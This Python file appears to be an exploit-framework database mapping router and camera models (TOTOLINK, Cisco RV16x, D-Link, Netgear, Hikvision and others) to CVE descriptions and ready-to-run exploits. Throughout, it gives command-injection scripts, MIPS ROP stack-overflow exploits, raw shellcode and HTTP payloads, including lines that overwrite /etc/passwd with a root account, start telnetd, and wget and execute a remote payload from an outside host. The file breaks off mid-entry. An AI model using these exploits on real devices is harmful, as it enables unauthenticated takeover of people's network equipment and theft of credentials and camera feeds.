from multidict import CIMultiDict

model_exp_dic = CIMultiDict()

model_exp_dic["TOTOLINK_A7000R"] = {
'lang_cmd_inject':["Modify command execution of language module",
'''
#Firmware V4.1cu.4080 test success
#author: doudoudedi
import sys
import requests
import json
try:
    ip = sys.argv[1]
    port = sys.argv[2]
    cmd = sys.argv[3] 
except:
    print("please use python exp.py [ip] [port] [command]")
    exit()
url="http://%s:%s/cgi-bin/cstecgi.cgi"%(ip,port)

command='ls -al'

headers={
    "User-Agent":"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/94.0",
    "Accept-Language":"en-US,en;q=0.5",
    "Accept-Encoding":"gzip, deflate",
    "Content-Type":"application/x-www-form-urlencoded; charset=UTF-8",
    "X-Requested-With":"XMLHttpRequest",
    "Origin":"http://%s:%s"%(ip,port),
}
data={
    "topicurl":"setting/setLanguageCfg",
    "langType":"cn;{};".format(cmd),
    "langFlag":"0"

print(requests.post(url,headers=headers,data=json.dumps(data)).text)
'''], 
    "stack_overflow":["SESSION_ID stackoverflow",
"""
#from b0ldfrev poc
#affect V4.1cu.4154
import requests
import urllib3
import sys
from struct import pack

if len(sys.argv)!=4:
	print "Parameter error. python exp.py url ulibc_base \\"command\\"\\ntips:Use the && symbol spacing command"
	exit(0)

url = sys.argv[1]
base =  int(sys.argv[2],16)
cmd= sys.argv[3]


if url[-1:]=='/':
   url=url[:-1]

offset=0x158
offset_s3=0x150
base=0x77c4f000   ###  modify

system=base+0x598f0 
gadget=base+0x00040224 #addiu $a0, $sp, 0x28; addiu $a1, $zero, 1; move $t9, $s3; jalr $t9; move $a2, $s5; 

#cmd="echo root:\$1\$\$qRPK7m23GJusamGpoGLby/:0:0::/root:/bin/sh > /etc/passwd && telnetd"

#cmd="wget http://192.168.122.11:3333/reverse -O /msf && chmod 777 /msf && /msf"


padding = "1"*offset_s3+pack('<I',system)

payload ="SESSION_ID="+padding.ljust(offset,"2")
payload += pack('<I',gadget)
payload += "3"*0x28
payload += cmd+"&"

urllib3.disable_warnings()

url= url+"/12345678.asp"
head= {'Cookie':payload}

r=requests.get(url,headers=head,verify=False)

print(r)
print(r.text)
print(r.content)
        """],
    "stack_ovefflow2":["SESSION_ID stackoverflow",
"""
#from b0ldfrev poc
#affect V9.1.0u.6115
import requests
import urllib3
import sys
from struct import pack


if len(sys.argv)!=4:
    print "Parameter error. python exp.py url uClibc_base \\"command\\"\\ntips:Use the & symbol spacing command"
    exit(0)

url = sys.argv[1]
base =  int(sys.argv[2],16)
cmd= sys.argv[3]


if url[-1:]=='/':
   url=url[:-1]

offset=0x160
offset_s4=0x14c+8

system=base+0x5F8F0

gadget=base+0x54aa0  #addiu $s1, $sp, 0x18; move $a0, $s1; addiu $a1, $zero, 0x100; move $t9, $s4; jalr $t9; move $a2, $s0; 

cmd="echo root:\$1\$\$qRPK7m23GJusamGpoGLby/:0:0::/root:/bin/sh > /etc/passwd && telnetd"
#cmd="wget http://192.168.122.11:3333/reverse -O /msf && chmod 777 /msf && /msf"

padding = "1"*offset_s4+pack('<I',system)

payload = "SESSION_ID="+padding.ljust(offset,"2")
payload += pack('<I',gadget)
payload += "3"*0x18
payload += cmd+"&"

urllib3.disable_warnings()

url= url+"/12345678.asp"
head= {'Cookie':payload}
r=requests.get(url,headers=head,verify=False)
print(r)
print(r.text)
print(r.content)
"""]
}

model_exp_dic["Cisco_RV16x"] = {
    "CVE-2021-1289":["(Unauth RCE)Multiple vulnerabilities in the web-based management interface of Cisco Small Business RV160, RV160W, RV260, RV260P, and RV260W VPN Routers could allow an unauthenticated, remote attacker to execute arbitrary code as the root user on an affected device. These vulnerabilities exist because HTTP requests are not properly validated. An attacker could exploit these vulnerabilities by sending a crafted HTTP request to the web-based management interface of an affected device. A successful exploit could allow the attacker to remotely execute arbitrary code on the device.",
"""
# from b0ldfrev
# affect firmware version <1.0.01.02
import requests
import sys
import base64
import urllib3

if len(sys.argv)!=3:
   print "Parameter error. python exp.py url \\"command\\""
   exit(0)

url = sys.argv[1]
cmd =  sys.argv[2]

CMD=";"+cmd+";"
CMD=base64.b64encode(CMD)

header = {'Authorization':"Basic "+CMD}

urllib3.disable_warnings()

if url[-1:]=='/':
  url=url[:-1]
r = requests.get(url+"/download/dniapi/", headers=header,verify=False)

print "DONE!"
"""],
    "CVE-2021-1602":["(Unauth RCE without parameters can be executed like CVE-2021-1289)",
"""
import requests
import sys
import base64
import urllib3

if len(sys.argv)!=3:
   print "Parameter error. python exp.py url \\"command with no parameters\\""
   exit(0)

url = sys.argv[1]
cmd =  sys.argv[2]

CMD="\\n"+cmd+"\\n"
CMD=base64.b64encode(CMD)

header = {'Authorization':"Basic "+CMD}

urllib3.disable_warnings()

if url[-1:]=='/':
  url=url[:-1]
r = requests.get(url+"/download/dniapi/", headers=header,verify=False)

print "DONE!"
"""]}

model_exp_dic["TOTOLINK_N600R"] = {
    "CVE-2022-26186": ["TOTOLINK N600R V4.3.0cu.7570_B20200620 was discovered to contain a command injection vulnerability via the exportOvpn interface at cstecgi.cgi",
'''
#affect V4.3.0cu.7570
POST /cgi-bin/cstecgi.cgi?exportOvpn=&type=user&comand=;touch${IFS}1.txt;&filetype=gz HTTP/1.1
Host: 192.168.0.254
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:93.0) Gecko/20100101 Firefox/93.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

aaaa
        '''],
    "CVE-2022-26187":["TOTOLINK N600R V4.3.0cu.7570_B20200620 was discovered to contain a command injection vulnerability via the pingCheck function",
"""
#affect V4.3.0cu.7570
import sys
import requests
import json
try:
    ip=sys.argv[1]
    port=sys.argv[2]
except:
    print "nonono! cant't do this"
    print "please use python exp.py [ip] [port] [command]"
    exit()
url="http://%s:%s/cgi-bin/cstecgi.cgi"%(ip,port)
command='ls -al'
headers={
    "User-Agent":"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/94.0",
    "Accept-Language":"en-US,en;q=0.5",
    "Accept-Encoding":"gzip, deflate",
    "Content-Type":"application/x-www-form-urlencoded; charset=UTF-8",
    "X-Requested-With":"XMLHttpRequest",
    "Origin":"http://%s:%s"%(ip,port),
}
data={
    "topicurl":"setting/setDiagnosisCfg",
    "actionFlag":"1",
    "ipDoamin":"www.baidu.com\\n{}\\n".format(command)
}
print requests.post(url,headers=headers,data=json.dumps(data)).text
		"""],
    "CVE-2022-26188":["TOTOLINK N600R V4.3.0cu.7570_B20200620 was discovered to contain a command injection vulnerability via /setting/NTPSyncWithHost",
"""
#affect V4.3.0cu.7570
import sys
import requests
import json
try:
    ip=sys.argv[1]
    port=sys.argv[2]
    command=sys.argv[3]
except:
    print "nonono! cant't do this"
    print "please use python exp.py [ip] [port] [command]"
    exit()
url="http://%s:%s/cgi-bin/cstecgi.cgi"%(ip,port)
headers={
    "User-Agent":"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/94.0",
    "Accept-Language":"en-US,en;q=0.5",
    "Accept-Encoding":"gzip, deflate",
    "Content-Type":"application/x-www-form-urlencoded; charset=UTF-8",
    "X-Requested-With":"XMLHttpRequest",
    "Origin":"http://%s:%s",
}
data={
    "topicurl":"setting/NTPSyncWithHost",
    "hostTime":"2021-11-11 10:34:09\\\"\\n{}\\n\\\"".format(command)
}
requests.post(url,headers=headers,data=json.dumps(data))
"""],
"CVE-2022-26189":["TOTOLINK N600R V4.3.0cu.7570_B20200620 was discovered to contain a command injection vulnerability via the langType parameter in the login interface",
"""
#affect V4.3.0cu.7570
import sys
import requests
import json
try:
    ip=sys.argv[1]
    port=sys.argv[2]
    command=sys.argv[3]
except:
    print "nonono! cant't do this"
    print "please use python exp.py [ip] [port] [command]"
    exit()
url="http://%s:%s/cgi-bin/cstecgi.cgi"%(ip,port)
headers={
    "User-Agent":"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/94.0",
    "Accept-Language":"en-US,en;q=0.5",
    "Accept-Encoding":"gzip, deflate",
    "Content-Type":"application/x-www-form-urlencoded; charset=UTF-8",
    "X-Requested-With":"XMLHttpRequest",
    "Origin":"http://%s:%s"%(ip,port),
		}
data={
    "topicurl":"setting/setLanguageCfg",
    "langType":"cn;{};".format(command)
}
requests.post(url,headers=headers,data=json.dumps(data))
"""]
}
model_exp_dic["TOTOLINK_EX200"] = {
    'CVE-2021-43711':
["The downloadFlile.cgi binary file in TOTOLINK EX200 V4.0.3c.7646_B20201211 has a command injection vulnerability when receiving GET parameters. The parameter name can be constructed for unauthenticated command execution.\n['https://github.com/doudoudedi/ToTolink_EX200_Cmmand_Execute/blob/main/ToTolink%20EX200%20Comand%20Injection2.md']", '\nGET /cgi-bin/downloadFlile.cgi?;wget${IFS}http://192.168.0.111:801/mm.txt;=hahah HTTP/1.1\n\nHost: 192.168.0.254\n\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:93.0) Gecko/20100101 Firefox/93.0\n\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\n\nAccept-Language: en-US,en;q=0.5\n\nAccept-Encoding: gzip, deflate\n\nConnection: close\n\nUpgrade-Insecure-Requests: 1\n']
}

model_exp_dic["Netgear_EX6100v1"] = {
    "CVE-2022-24655":
["A stack overflow vulnerability exists in the upnpd service in Netgear EX6100v1 201.0.2.28, CAX80 2.1.2.6, and DC112A 1.0.0.62, which may lead to the execution of arbitrary code without authentication.\n['https://github.com/doudoudedi/Netgear_product_stack_overflow/blob/main/NETGEAR%20EX%20series%20upnpd%20stack_overflow.md', 'https://kb.netgear.com/000064615/Security-Advisory-for-Pre-Authentication-Command-Injection-on-EX6100v1-and-Pre-Authentication-Stack-Overflow-on-Multiple-Products-PSV-2021-0282-PSV-2021-0288', 'https://www.netgear.com/about/security/']", '\n#Aouth:doudoudedi\n#please pip install pwn\nfrom pwn import *\nimport sys\nimport os\nchoice=0\nrequest=\'\'\ntry:\n    target_ip=sys.argv[1]\n    target_version=sys.argv[2]\nexcept:\n    print("python ./exp.py ipaddress id")\n    print("if you firmware version is EX6100-V1.0.2.28_1.1.138.chk or please EX6100-V1.0.2.28_1.1.136 id is 1")\n    print("if you firmware version is EX6100-V1.0.2.24_1.1.134.chk id is 2")\n    exit(0)\n\ndef generate_payload():\n    global target_version,request,choice\n    if target_version=="1": \n            system_addr=0x00422848\n            change_password=0x042C550\n    if target_version=="2":\n            system_addr=0x422828\n            change_password=0x042C530\n    aim=0\n    print("1.open telnetd 25\\n2.change http password (NULL)")\n    choice=int(input())\n    if(choice==1):\n    aim=system_addr\n    request = b"SUBSCRIBE /gena.telnetd${IFS}-p${IFS}25;?service=" + b"1" + b" HTTP/1.0\\n"\n    request += b"Host: " + b"192.168.1.0:" + b"80" + b"\\n"\n    request += b"Callback: <http://192.168.0.4:34033/ServiceProxy27>\\n"\n    request += b"NT: upnp:event\\n"\n    request += b"Timeout: Second-1800\\n"\n    request += b"Accept-Encoding: gzip, deflate\\n"\n    request += request+b"doud"\n    request += request\n    request = request.ljust(0x1f00,b"a")\n    request += p32(0x7fff7030)\n    request = request.ljust(0x1f48-0x14,b"a")\n    request += p32(aim)\n    if(choice==2):\n    aim=change_password\n    request = b"SUBSCRIBE /gena.telnetd${IFS}-p${IFS}25;?service=" + b"1" + b" HTTP/1.0\\n"\n    request += b"Host: " + b"192.168.1.0:" + b"80" + b"\\n"\n    request += b"Callback: <http://192.168.0.4:34033/ServiceProxy27>\\n"\n    request += b"NT: upnp:event\\n"\n    request += b"Timeout: Second-1800\\n"\n    request += b"Accept-Encoding: gzip, deflate\\n"\n    request += request+b"doud"\n    request += request\n    request = request.ljust(0x1f00,b"a")\n    request += p32(0x7fff7030)\n    request += p32(0x7fff7030)*12\n    request += p32(0x42C550)\n    request += p32(aim)\n\n\ndef attack():\n    p=remote(target_ip,5000)\n    p.send(request)\n    if(choice==1):\n    os.system("telnet %s 25"%(target_ip))\n    #p.interactive()\n#request += p32(0x422944)\n#request += "a"*0x500\n#request += p32(0x7fff7030)*8\nif __name__=="__main__":\n    generate_payload()\n    attack()\n']
}

model_exp_dic["TOTOLINK_A800R"] = {
    "A800R_Command_inject": ["unauth rce downloadFlile.cgi", "curl -v 'http://192.168.2.10/cgi-bin/downloadFlile.cgi?;command;'"]
}

model_exp_dic["wavlink_WL-WN535K3"] = {
    "WN535K3_Command_injection":["unauth rce downloadFlile.cgi",
"""
http://192.168.2.10/cgi-bin/mesh.cgi?page=extender&key=';command;'
"""]
}

model_exp_dic["TOTOLINK_A810R"] = {
    "downloadFile_cmd_inject":["unauth rce downloadFlile.cgi",
"""
#from https://github.com/Erebua/CVE
GET /cgi-bin/downloadFlile.cgi?payload=`dw>../2.txt` HTTP/1.1
Host: 192.168.163.165
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
"""]
}

model_exp_dic["BR-6428nS_v3"] = {
    "Command_injection_auth":["auth rce",
"""
#from https://github.com/Erebua/CVE
POST /goform/formWlanMP HTTP/1.1
Host: 192.168.2.1
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:107.0) Gecko/20100101 Firefox/107.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 53
Origin: http://192.168.2.1
Authorization: Basic YWRtaW46MTIzNA==
Connection: close
Referer: http://192.168.2.1/status.asp
Cookie: language=14
Upgrade-Insecure-Requests: 1

ateFunc=1;touch%20/tmp/Swe3ty&submit-url=%2Findex.asp
"""]
}

model_exp_dic["DS-2CD2xx0F-ISeries"] = {
    "CVE-2017-7921":
["An Improper Authentication issue was discovered in Hikvision DS-2CD2xx2F-I Series V5.2.0 build 140721 to V5.4.0 build 160530, DS-2CD2xx0F-I Series V5.2.0 build 140721 to V5.4.0 Build 160401, DS-2CD2xx2FWD Series V5.3.1 build 150410 to V5.4.4 Build 161125, DS-2CD4x2xFWD Series V5.2.0 build 140721 to V5.4.0 Build 160414, DS-2CD4xx5 Series V5.2.0 build 140721 to V5.4.0 Build 160421, DS-2DFx Series V5.2.0 build 140805 to V5.4.5 Build 160928, and DS-2CD63xx Series V5.0.9 build 140305 to V5.3.5 Build 160106 devices. The improper authentication vulnerability occurs when an application does not adequately or correctly authenticate users. This may allow a malicious user to escalate his or her privileges on the system and gain access to sensitive information.\n['http://www.hikvision.com/us/about_10805.html', 'https://ghostbin.com/paste/q2vq2', 'https://ics-cert.us-cert.gov/advisories/ICSA-17-124-01', 'http://www.securityfocus.com/bid/98313']", '\nhttp://IP:PORT/Security/users?auth=YWRtaW46MTEK  #get al userinfo\nhttp://IP:PORT/onvif-http/snapshot?auth=YWRtaW46MTEK #get camera video\nhttp://IP:PORT/System/configurationFile?auth=YWRtaW46MTEK # get passwd file\n']
}

model_exp_dic["TOTOLINK_X5000R"] = {
    "downloadFile_cmd_inject":["unauth rce downloadFlile.cgi",
"""
#from https://github.com/Erebua/CVE
GET /cgi-bin/downloadFlile.cgi?payload=`dw>../2.txt` HTTP/1.1
Host: 192.168.163.165
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
"""]
}

model_exp_dic["DIR-816"] = {
    "CVE-2021-39510":
["An issue was discovered in D-Link DIR816_A1_FW101CNB04 750m11ac wireless router, The HTTP request parameter is used in the handler function of /goform/form2userconfig.cgi route, which can construct the user name string to delete the user function. This can lead to command injection through shell metacharacters.\n['https://github.com/doudoudedi/main-DIR-816_A1_Command-injection', 'https://github.com/doudoudedi/main-DIR-816_A1_Command-injection/blob/main/injection_A1.md', 'https://www.dlink.com/en/security-bulletin/']", '\ncurl -s http://192.168.33.9/dir_login.asp  | grep tokenid\ncurl -i -X POST http://192.168.33.9/goform/form2userconfig.cgi  -d "username=Admin\';shutdown;\'&oldpass=123&newpass=123&confpass=123&deluser=Delete&select=s0&hiddenpass=&submit.htm%3Fuserconfig.htm=Send"\n'],
"CVE-2021-39509":
["An issue was discovered in D-Link DIR-816 DIR-816A2_FWv1.10CNB05_R1B011D88210 The HTTP request parameter is used in the handler function of /goform/form2userconfig.cgi route, which can construct the user name string to delete the user function. This can lead to command injection through shell metacharacters.\n['https://github.com/doudoudedi/main-DIR-816_A2_Command-injection', 'https://github.com/doudoudedi/main-DIR-816_A2_Command-injection/blob/main/injection.md', 'https://www.dlink.com/en/security-bulletin/']", '\ncurl -s http://192.168.33.9/dir_login.asp  | grep tokenid\ncurl -i -X POST http://192.168.33.9/goform/form2userconfig.cgi  -d "username=IjtyZWJvb3Q7Ig==&oldpass=123&newpass=MTIz&confpass=MTIz&deluser=Delete&select=s0&hiddenpass=&submit.htm%3Fuserconfig.htm=Send&tokenid=xxxxx"#input id\n'],
"stackover_flow_host":["unauth stackoverflow",
"""
# Tested product: DIR-816 (CN)
# Hardware version: A2
# Firmware version: v1.10B05 (2018/01/04)
# Firmware name: DIR-816A2_FWv1.10CNB05_R1B011D88210.img
#
import socket
p = socket.socket(socket.AF_INET, socket.SOCK_STREAM)                 
p.connect(("192.168.0.1" , 80))
shellcode = "A"*0x200   # *** Not the correct shellcode for exploit ***
rn = "\\r\\n"
strptr = "\\x60\\x70\\xff\\x7f"
padding = "\\x00\\x00\\x00\\x00"
payload = "GET /sharefile?test=A" + "HTTP/1.1" + rn
payload += "Host: " + "A"*0x70 + strptr*2 + "A"*0x24  + "\\xb8\\xfe\\x48" + rn
payload += "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0" + rn
payload += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" + rn
payload += "Accept-Language: en-US,en;q=0.5" + rn
payload += "Accept-Encoding: gzip, deflate" + rn
payload += "Cookie: curShow=; ac_login_info=passwork; test=A" + padding*0x200 + shellcode + padding*0x4000 + rn
payload += "Connection: close" + rn
payload += "Upgrade-Insecure-Requests: 1" + rn
payload += rn
p.send(payload)
print p.recv(4096)
"""],
    "CVE-2017-17562":
["Embedthis GoAhead before 3.6.5 allows remote code execution if CGI is enabled and a CGI program is dynamically linked. This is a result of initializing the environment of forked CGI scripts using untrusted HTTP request parameters in the cgiHandler function in cgi.c. When combined with the glibc dynamic linker, this behaviour can be abused for remote code execution using special parameter names such as LD_PRELOAD. An attacker can POST their shared object payload in the body of the request, and reference it using /proc/self/fd/0.\n['https://github.com/elttam/advisories/tree/master/CVE-2017-17562', 'https://github.com/embedthis/goahead/commit/6f786c123196eb622625a920d54048629a7caa74', 'https://github.com/embedthis/goahead/issues/249', 'https://www.elttam.com.au/blog/goahead/', 'https://www.exploit-db.com/exploits/43360/', 'https://www.exploit-db.com/exploits/43877/', 'http://www.securitytracker.com/id/1040702']", '\n#include #include unsigned char sc[] = {"\\xff\\xff\\x04\\x28\\xa6\\x0f\\x02\\x24\\x0c\\x09\\x09\\x01\\x11\\x11\\x04" "\\x28\\xa6\\x0f\\x02\\x24\\x0c\\x09\\x09\\x01\\xfd\\xff\\x0c\\x24\\x27\\x20" "\\x80\\x01\\xa6\\x0f\\x02\\x24\\x0c\\x09\\x09\\x01\\xfd\\xff\\x0c\\x24\\x27" "\\x20\\x80\\x01\\x27\\x28\\x80\\x01\\xff\\xff\\x06\\x28\\x57\\x10\\x02\\x24" "\\x0c\\x09\\x09\\x01\\xff\\xff\\x44\\x30\\xc9\\x0f\\x02\\x24\\x0c\\x09\\x09" "\\x01\\xc9\\x0f\\x02\\x24\\x0c\\x09\\x09\\x01\\x15\\xb3\\x05\\x3c\\x02\\x00" "\\xa5\\x34\\xf8\\xff\\xa5\\xaf\\x10\\x67\\x05\\x3c\\xc0\\xa8\\xa5\\x34\\xfc" "\\xff\\xa5\\xaf\\xf8\\xff\\xa5\\x23\\xef\\xff\\x0c\\x24\\x27\\x30\\x80\\x01" "\\x4a\\x10\\x02\\x24\\x0c\\x09\\x09\\x01\\x62\\x69\\x08\\x3c\\x2f\\x2f\\x08" "\\x35\\xec\\xff\\xa8\\xaf\\x73\\x68\\x08\\x3c\\x6e\\x2f\\x08\\x35\\xf0\\xff" "\\xa8\\xaf\\xff\\xff\\x07\\x28\\xf4\\xff\\xa7\\xaf\\xfc\\xff\\xa7\\xaf\\xec" "\\xff\\xa4\\x23\\xec\\xff\\xa8\\x23\\xf8\\xff\\xa8\\xaf\\xf8\\xff\\xa5\\x23" "\\xec\\xff\\xbd\\x27\\xff\\xff\\x06\\x28\\xab\\x0f\\x02\\x24\\x0c\\x09\\x09" "\\x01" }; static void before_main(void) __attribute__((constructor)); static void before_main(void) { void(*s)(void); s = sc; s(); } \ncurl -X POST -b "user=admin;platform=0" --data-binary @payloads/mipsel-hw.so http://192.168.16.1/cgi-bin/upload_settings.cgi?LD_PRELOAD=/proc/self/fd/0 -i\n']
}

model_exp_dic["DIR-810L"] = {
    "CVE-2021-45382":
        ['A Remote Command Execution (RCE) vulnerability exists in all series H/W revisions D-link DIR-810L, DIR-820L/LW, DIR-826L, DIR-830L, and DIR-836L routers via the DDNS function in ncc2 binary file. Note: DIR-810L, DIR-820L, DIR-830L, DIR-826L, DIR-836L, all hardware revisions, have reached their End of Life ("EOL") /End of Service Life ("EOS") Life-Cycle and as such this issue will not be patched.\n[\'https://github.com/doudoudedi/D-LINK_Command_Injection1/blob/main/D-LINK_Command_injection.md\', \'https://supportannouncement.us.dlink.com/announcement/publication.aspx?name=SAP10264\']', '\nPOST /ddns_check.ccp HTTP/1.1\nHost: 192.168.0.1\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded\nX-Requested-With: XMLHttpRequest\nContent-Length: 186\nOrigin: http://192.168.0.1\nConnection: close\nReferer: http://192.168.0.1/storage.asp\nCookie: hasLogin=1\n\nccp_act=doCheck&ddnsHostName=;wget${IFS}http://192.168.0.100:9988/doudou.txt;&ddnsUsername=;wget${IFS}http://192.168.0.100:9988/doudou.txt;&ddnsPassword=123123123\n']
}

model_exp_dic["DIR-605"] = {

}

model_exp_dic["DIR-860L"] = {
    "CVE-2018-20114":
['On D-Link DIR-818LW Rev.A 2.05.B03 and DIR-860L Rev.B 2.03.B03 devices, unauthenticated remote OS command execution can occur in the soap.cgi service of the cgibin binary via an "&amp;&amp;" substring in the service parameter.  NOTE: this issue exists because of an incomplete fix for CVE-2018-6530.\n[\'https://github.com/pr0v3rbs/CVE/tree/master/CVE-2018-20114\']', '\n#unauthenticated remote code execution \n#affect version DIR-818LW_REVA - 2.05。B03，DIR-860L_REVB - 2.03。B03\n# nc 192.168.0.1 49152\nPOST /soap.cgi?service=&&iptables -P INPUT ACCEPT&&iptables -P FORWARD ACCEPT&&iptables -P OUTPUT ACCEPT&&iptables -t nat -P PREROUTING ACCEPT&&iptables -t nat -P OUTPUT ACCEPT&&iptables -t nat -P POSTROUTING ACCEPT&&telnetd -p 9999&& HTTP/1.1\nHost: 192.168.0.1:49152\nAccept-Encoding: identity\nContent-Length: 16\nSOAPAction: "whatever-serviceType#whatever-action"\nContent-Type: text/xml\n\n# telnet 192.168.0.1 9999\n']
}

model_exp_dic["TEW-651BR"] = {
    "CVE-2019-11399":
["An issue was discovered on TRENDnet TEW-651BR 2.04B1, TEW-652BRP 3.04b01, and TEW-652BRU 1.00b12 devices. OS command injection occurs through the get_set.ccp lanHostCfg_HostName_1.1.1.0.0 parameter.\n['https://github.com/pr0v3rbs/CVE/blob/master/CVE-2019-11399/ticket.png', 'https://www.trendnet.com/support/']", '\nPOST /get_set.ccp HTTP/1.1\n\nccp_act=set&\nccpSubEvent=CCP_SUB_LAN&\nnextPage=lan.htm&\nold_ip=192.168.10.1&\nold_mask=255.255.255.0&\nnew_ip=192.168.10.1&\nnew_mask=255.255.255.0&\nigd_DeviceMode_1.0.0.0.0=0&\nlanHostCfg_HostName_1.1.1.0.0=`cmd`&\nlanHostCfg_IPAddress_1.1.1.0.0=192.168.10.1&\nlanHostCfg_SubnetMask_1.1.1.0.0=255.255.255.0&\nlanHostCfg_DHCPServerEnable_1.1.1.0.0=1&\nlanHostCfg_MinAddress_1.1.1.0.0=192.168.10.101&\nlanHostCfg_MaxAddress_1.1.1.0.0=192.168.10.199&\nlanHostCfg_DomainName_1.1.1.0.0=&\nlanHostCfg_DHCPLeaseTime_1.1.1.0.0=10080&\nlanHostCfg_StaticDHCPEnable_1.1.1.0.0=1\n']
}

model_exp_dic["DIR-818LW"] = {
    "CVE-2018-19986":
['In the /HNAP1/SetRouterSettings message, the RemotePort parameter is vulnerable, and the vulnerability affects D-Link DIR-818LW Rev.A 2.05.B03 and DIR-822 B1 202KRb06 devices. In the SetRouterSettings.php source code, the RemotePort parameter is saved in the $path_inf_wan1."/web" internal configuration memory without any regex checking. And in the IPTWAN_build_command function of the iptwan.php source code, the data in $path_inf_wan1."/web" is used with the iptables command without any regex checking. A vulnerable /HNAP1/SetRouterSettings XML message could have shell metacharacters in the RemotePort element such as the `telnetd` string.\n[\'https://github.com/pr0v3rbs/CVE/tree/master/CVE-2018-19986%20-%2019990\']', '\n#POC XML data\n<?xml version="1.0" encoding="utf-8"?> <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"> <soap:Body>\n<SetRouterSettings xmlns="http://purenetworks.com/HNAP1/">\n<ManageRemote>default</ManageRemote>\n<ManageWireless>default</ManageWireless>\n<RemoteSSL>default</RemoteSSL>\n<RemotePort>`telnetd`</RemotePort>\n<DomainName>default</DomainName>\n<WiredQoS>default</WiredQoS>\n</SetRouterSettings>\n</soap:Body> </soap:Envelope>\n']
}

model_exp_dic["DIR-846"] = {
    "CVE-2021-46315":
['Remote Command Execution (RCE) vulnerability exists in HNAP1/control/SetWizardConfig.php in D-Link Router DIR-846 DIR846A1_FW100A43.bin and DIR846enFW100A53DLA-Retail.bin. Malicoius users can use this vulnerability to use "\\ " or backticks in the shell metacharacters in the ssid0 or ssid1 parameters to cause arbitrary command execution. Since CVE-2019-17510 vulnerability has not been patched and improved www/hnap1/control/setwizardconfig.php, can also use line breaks and backquotes to bypass.\n[\'https://github.com/doudoudedi/DIR-846_Command_Injection/blob/main/DIR-846_Command_Injection1.md\', \'https://www.dlink.com/en/security-bulletin/\']', '\n#affect A1version\nPOST /HNAP1/ HTTP/1.1\nHost: 192.168.0.1\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0\nAccept: application/json\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/json\nSOAPACTION: "http://purenetworks.com/HNAP1/SetNetworkTomographySettings"\nHNAP_AUTH: AB26D09C30FC07AF9FA05EF59B3B2558 1640421298429\nContent-Length: 76\nOrigin: http://192.168.0.1\nConnection: close\nReferer: http://192.168.0.1/Diagnosis.html?t=1640421281425\nCookie: uid=fN5PwZCT; PrivateKey=B2488589E39C47E4F8349060E88008DE; PHPSESSID=6209b08bddf630e68695800cd08e4203; sys_domain=dlinkrouter.com; timeout=2\n\n{"SetWizardConfig":{"wl(1).(0)_ssid":"`reboot`","wl(0).(0)_ssid":"aa\\nreboot\\n"}}\n        '],
    "CVE-2021-46315":
"""
#affect A1version
POST /HNAP1/ HTTP/1.1
Host: 192.168.0.1
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
SOAPACTION: "http://purenetworks.com/HNAP1/SetNetworkTomographySettings"
HNAP_AUTH: AB26D09C30FC07AF9FA05EF59B3B2558 1640421298429
Content-Length: 76
Origin: http://192.168.0.1
Connection: close
Referer: http://192.168.0.1/Diagnosis.html?t=1640421281425
Cookie: uid=fN5PwZCT; PrivateKey=B2488589E39C47E4F8349060E88008DE; PHPSESSID=6209b08bddf630e68695800cd08e4203; sys_domain=dlinkrouter.com; timeout=2

{"SetWizardConfig":{"wl(1).(0)_ssid":"`reboot`","wl(0).(0)_ssid":"aa\\nreboot\\n"}}
        """,
    "CVE-2021-46314":
